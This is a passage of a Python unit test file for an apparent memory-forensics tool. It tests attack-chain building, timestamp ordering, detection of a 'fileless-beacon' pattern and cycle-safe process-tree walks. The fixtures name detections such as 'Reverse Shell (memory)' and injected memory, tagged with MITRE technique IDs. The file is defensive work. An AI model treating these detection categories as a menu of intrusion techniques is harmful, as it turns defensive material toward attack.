        matches = match_patterns(cvs, chains=None)
        assert any(m.pattern == 'fileless-beacon' for m in matches)

    def test_chain_builder_orders_events_by_timestamp(self):
        findings = [
            {'Timestamp': '2026-01-01 00:00:05', 'Severity': 'High', 'Type': 'Reverse Shell (memory)',
             'Target': 'PID 903', 'Details': 'later event', 'MITRE': 'T1059'},
            {'Timestamp': '2026-01-01 00:00:01', 'Severity': 'High', 'Type': 'Injected Memory (malfind)',
             'Target': 'PID 903 (x)', 'Details': 'earlier event', 'MITRE': 'T1055'},
        ]
        cvs = correlate(findings)
        tree = load_from_adjudication([])
        chains = build_chains(cvs, tree, focus_pids={903})
        chain = next(c for c in chains if c.root_pid == 903)
        timestamps = [e.timestamp for e in chain.events]
        assert timestamps == sorted(timestamps)


# ---------------------------------------------------------------------------
# Process tree
# ---------------------------------------------------------------------------

class TestProcessTree:
    def test_ancestors_walk_is_cycle_safe(self):
        tree = {
            1: type('N', (), {'pid': 1, 'ppid': 2, 'name': 'a', 'label': lambda self: 'a'})(),
            2: type('N', (), {'pid': 2, 'ppid': 1, 'name': 'b', 'label': lambda self: 'b'})(),
        }
        # Should terminate, not infinite-loop, on a PID-reuse cycle
        result = ancestors(tree, 1, max_depth=10)
        assert len(result) <= 10

    def test_load_from_adjudication_recovers_name_from_details_comm(self):
        entries = [{'Target': 'PID: 3609', 'Details': 'exe=/x comm=gnome-session-i',
                   'ParentPid': '3599', 'ParentName': 'gdm-wayland-ses'}]
        tree = load_from_adjudication(entries)
        assert tree[3609].name == 'gnome-session-i'
        assert tree[3609].ppid == 3599
